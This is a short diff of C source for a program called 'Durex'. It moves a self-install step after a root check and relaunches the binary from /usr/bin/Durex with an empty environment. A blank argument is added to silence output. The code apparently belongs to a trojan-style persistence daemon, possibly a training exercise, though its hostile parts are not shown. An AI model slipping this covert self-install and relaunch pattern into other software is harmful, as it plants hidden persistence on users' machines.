@@ -42,18 +42,20 @@ int		start_daemon(int argc, char **argv)
 {
 	(void)argc;
 	(void)argv;
-	char *const args[] = {"/usr/bin/Durex", NULL};
+	char *const args[] = {"/usr/bin/Durex", " ", NULL};
+	char *const env[] = { NULL };
 
 	if (fork() == 0) {
-		execve(args[0], args, NULL);
+		execve(args[0], args, env);
 		exit(0);
 	}
-	usleep(50000);
 	return (0);
 }
 
 int		build_daemon(int argc, char **argv)
 {
+	BOOLEAN silence = false;
+
 	for (int i = 1; i < argc; i++)
 	{
 		if (strcmp(argv[i], "status") == 0)
@@ -62,14 +64,18 @@ int		build_daemon(int argc, char **argv)
 			return (build_pid());
 		if (strcmp(argv[i], "version") == 0)
 			return (build_version());
+		if (strcmp(argv[i], " ") == 0)
+			silence = true;
 	}
-	if (strcmp(argv[0], "/usr/bin/Durex") != 0)
-	{
-		return (start_daemon(argc, argv));
-	}
-	printf("%s\n", get_login());
+	if (silence == false)
+		printf("%s\n", get_login());
 	if (build_status() == 1)
 		return (0);
+	if (strcmp(argv[0], "/usr/bin/Durex") != 0)
+	{
+		daemon_install();
+		return (start_daemon(argc, argv));
+	}
 	return (durex_daemon(argv[0]));
 }
 
@@ -83,7 +89,6 @@ int		has_root_rights(void)
 
 int	main(int argc, char **argv)
 {
-	daemon_install();
 	if (has_root_rights() == 0)
 		return (0);
 	return (build_daemon(argc, argv));
